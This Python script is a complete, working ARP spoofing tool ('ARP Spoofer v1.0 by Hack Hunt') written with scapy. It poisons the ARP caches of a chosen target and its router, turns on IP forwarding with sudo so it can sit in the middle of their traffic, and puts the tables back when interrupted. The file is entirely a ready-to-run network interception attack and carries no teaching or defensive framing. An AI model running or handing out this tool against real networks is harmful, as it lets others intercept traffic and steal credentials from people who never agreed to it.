#! usr/bin/env python3

import sys


try:
    import scapy.all as scapy
    import argparse
    import subprocess
    import time
    import re
except KeyboardInterrupt:
    print("\n[-] Exiting...")
    sys.exit()

INTERFACE = ""


def get_mac(ip):
    try:
        global INTERFACE
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answer = scapy.srp(arp_request_broadcast,
                           timeout=3,
                           verbose=False,
                           iface=INTERFACE)[0]

        return answer[0][1].hwsrc
    except IndexError:
        print("\n[-] No device found! Check IP Address: " + ip + "\n")
    except KeyboardInterrupt:
        print("\n[-] Exiting...")
        sys.exit()


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,
                       hwdst=target_mac,
                       psrc=spoof_ip,
                       pdst=target_ip)
    scapy.send(packet, verbose=False, count=2)


def restore_arp_table(target_ip, source_ip):
    dest_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,
                       pdst=target_ip,
                       hwdst=dest_mac,
                       psrc=source_ip,
                       hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)


def arp_spoofer(target_ip, router_ip):
    send_packets_count = 0
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        send_packets_count += 2
        if send_packets_count in [2, 4]:
            if send_packets_count == 2:
                print("[+] Packet Forwarding Enabled...", 'green')
            subprocess.call(["sudo sysctl -w net.ipv4.ip_forward=1"],
                            shell=True,
                            stderr=subprocess.DEVNULL,
                            stdout=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL)
        print("\r[+] Sent " + str(send_packets_count) + " packets.", end="")
        time.sleep(0.5)


def get_arguments():
    parser = argparse.ArgumentParser(prog="ARP Spoofer",
                                     usage="%(prog)s [options]\n\t[-t | --target] ip\n\t[-r | --router] ip\n\t[-i | "
                                           "--interface] interface_name",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     description=""">>> | ARP Spoofer v1.0 by Hack Hunt| <<<
    --------------------------------""")

    parser._optionals.title = "Optional Argument"

    required_arguments = parser.add_argument_group("Required Arguments")

    required_arguments.add_argument('-i', "--interface",
                                    dest="interface", metavar="",
                                    help="Specify interface",
                                    required=True)

    required_arguments.add_argument('-t', "--target",
                                    dest="target", metavar="",
                                    help="Specify the target's IP",
                                    required=True)

    required_arguments.add_argument('-r', "--router",
                                    dest="router", metavar="",
                                    help="Specify the router's IP",
                                    required=True)

    args = parser.parse_args()
    check_interface(args)

    return args


def check_interface(args):
    try:
        subprocess.check_call(["sudo", "ifconfig", args.interface],
                              stdin=subprocess.DEVNULL,
                              stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        print("[-] No interface (" + args.interface + ") found, use --help or -h for more info.")
        sys.exit()

    if not re.match("\d+\.\d+\.\d+\.\d+", args.target):
        print("[-] Error! Invalid target's ip format: " + args.target)
        sys.exit()

    if not re.match("\d+\.\d+\.\d+\.\d+", args.router):
        print("[-] Error! Invalid router's ip format: " + args.router)
        sys.exit()


def main():
    global INTERFACE

    args = get_arguments()

    target_ip = args.target
    router_ip = args.router
    INTERFACE = args.interface
    try:
        print("[+] Initializing ARP Spoofer v1.0", 'green')
        print("[+] Loading...", 'yellow')
        arp_spoofer(target_ip, router_ip)
    except KeyboardInterrupt:
        print("\n[+] Fixing ARP table.", 'yellow')
        restore_arp_table(target_ip, router_ip)
        restore_arp_table(router_ip, target_ip)
        print("[+] Fixed. Quiting...", 'green')


main()